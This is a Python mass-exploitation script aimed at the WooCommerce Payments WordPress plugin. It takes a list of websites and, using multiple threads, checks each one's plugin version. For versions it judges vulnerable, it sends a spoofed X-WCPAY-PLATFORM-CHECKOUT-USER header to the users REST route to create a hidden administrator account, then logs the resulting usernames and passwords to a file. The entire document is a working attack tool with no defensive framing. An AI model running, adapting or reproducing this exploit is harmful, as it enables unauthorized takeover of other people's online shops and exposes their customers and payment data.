# code by L (hanzou's brother)
import re
import sys
import urllib3
import requests
from colorama import Fore, Style
import threading
import random
import string
import username

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_password(length):
    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for _ in range(length))
    while not any(char.isdigit() for char in password) or not any(char.isupper() for char in password) or not any(char.islower() for char in password):
        password = ''.join(random.choice(characters) for _ in range(length))
    return password

def check_version(target):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    try:
        r = requests.get(f"{target}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False, timeout=10)
        version = re.search(r"Stable tag: (.*)", r.text).group(1)
    except requests.Timeout:
        return 'Down'
    except:
        return None

    if int(version.replace('.', '')) < 562:
        return f'{version} - vulnerable!'
    else:
        return f'{version} - not vulnerable!'

def add_admin(target, email):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111.',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    generated_username = username.generate_username(8)
    generated_password = generate_random_password(16)

    data = {
        'rest_route': '/wp/v2/users',
        'username': generated_username,
        'email': email,
        'password': generated_password,
        'roles': 'administrator'
    }

    with requests.Session() as session:
        try:
            session.get(target, headers=headers, verify=False, timeout=10)
        except requests.Timeout:
            return False
        except:
            return False

        response = session.post(target, data=data, headers=headers, verify=False, timeout=10)
        if response.status_code == 201:
            return (generated_username, generated_password)
        else:
            return False

def exploit_website(website, email):
    if not website.startswith(("http://", "https://")):
        website = "https://" + website

    print(Fore.YELLOW + f'Exploiting {website}')
    version = check_version(website)
    if version is not None:
        print(Style.RESET_ALL + "Site version:", end=' ')
        if "vulnerable" in version:
            print(Fore.GREEN + version)
            credentials = add_admin(website, email)
            if credentials:
                generated_username, generated_password = credentials
                with open("results.txt", "a") as file:
                    file.write(f"Site: {website}\n")
                    file.write(f"Username: {generated_username}\n")
                    file.write(f"Password: {generated_password}\n\n")
                print(Style.RESET_ALL + Fore.GREEN + "Vuln")
                print(f'Username: {generated_username}')
                print(f'Password: {generated_password}')
                print()
                return
            else:
                print(Style.RESET_ALL + Fore.RED + "Not Vuln")
                print(Fore.RED + "Failed to add admin.")
        else:
            print(Fore.RED + version)
            print(Style.RESET_ALL + Fore.RED + "Not Vuln")
    else:
        print(Fore.RED + "Failed to check version")
        print(Style.RESET_ALL + Fore.RED + "Not Vuln")

def main():
    print()
    print(Fore.BLUE + """  _      __          _____                                
 | | /| / /__  ___  / ___/__  __ _  __ _  ___ ___________ 
 | |/ |/ / _ \/ _ \/ /__/ _ \/  ' \/  ' \/ -_) __/ __/ -_)
 |__/|__/\___/\___/\___/\___/_/_/_/_/_/_/\__/_/  \__/\__/ 
                                                          """)
    print("[ WooCommerce Payments - Unauthorized Add Admin User ]")
    print(Style.RESET_ALL)

    weblist = input('Weblist: ')
    email = input('Your email: ')
    num_threads = int(input('Threads (number): '))

    with open(weblist, 'r') as file:
        websites = file.read().splitlines()

    if not websites:
        print(Fore.RED + 'Error: The website list is empty')
        exit()

    threads = []
    for website in websites:
        thread = threading.Thread(target=exploit_website, args=(website, email))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
